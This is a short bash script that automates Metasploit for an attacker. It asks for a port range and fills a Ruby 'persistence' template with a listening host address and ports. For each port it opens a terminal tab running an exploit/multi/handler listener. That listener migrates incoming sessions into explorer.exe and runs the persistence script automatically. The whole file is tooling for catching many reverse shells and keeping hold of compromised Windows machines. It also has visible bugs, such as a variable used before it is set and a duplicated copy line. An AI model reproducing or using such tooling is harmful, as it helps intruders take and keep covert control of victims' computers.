#! /bin/bash
lhost='"192.168.0.26"'
lhost2='192.168.0.26'
 echo "Port of the firt payload"
 read portstart
echo "The port of the first payload is $portstart"

echo "Waiting for last port of port range"
read portend
echo "U choosed to end with $portend"

#how many session user want
echo "How many session u want to open ?"
let "num = portend - portstart"
echo "u want to start $num sessions"
let "port  = portstart"
echo "port=$port"

#open requested number of terminal tab ith listener ready"

num=$(($num+1))
while test $num -ne 0; 
do
	echo "actual port=$port"
	cp template.rb "$port2"_"$lhost2"_persistence.rb
	cp template.rb "$port2"_"$lhost2"_persistence.rb
	port2=$(($port+1))
	sed -i 's/"HEREISLHOST"/'"$lhost"'/' "$port"_"$lhost2"_persistence.rb 
	sed -i 's/"HEREISLPORT"/'"$port"'/' "$port"_"$lhost2"_persistence.rb
	sed -i 's/"HEREISLHOST"/'"$lhost"'/' "$port2"_"$lhost2"_persistence.rb 
	sed -i 's/"HEREISLPORT"/'"$port"'/' "$port2"_"$lhost2"_persistence.rb
	gnome-terminal --tab --command='/usr/share/metasploit-framework/msfconsole -x "use exploit/multi/handler; set lport '$port'; set PrependMigrate true; set PrependMigrateProc explorer.exe; set AutoRunScript /root/Bureau/GRENADA/tmp/'"$port2"'_'"$lhost2"'_persistence.rb; run"'
	
	if [ $port -ne $portend ]
then
        port=$(($port+1))
	num=$(($num -1))
else
        exit
fi
	
	
done

